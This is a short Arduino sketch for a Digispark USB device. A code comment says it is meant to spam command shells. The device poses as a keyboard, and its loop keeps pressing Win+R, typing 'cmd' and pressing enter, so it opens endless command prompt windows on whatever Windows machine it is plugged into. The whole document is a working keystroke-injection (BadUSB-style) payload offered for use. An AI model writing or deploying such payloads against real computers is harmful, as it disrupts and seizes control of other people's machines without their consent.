#include "DigiKeyboard.h"
void setup() {
//This script is to make a a spam of CMD shells
}
void loop(){
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cmd");
  DigiKeyboard.delay(50);

  }
  
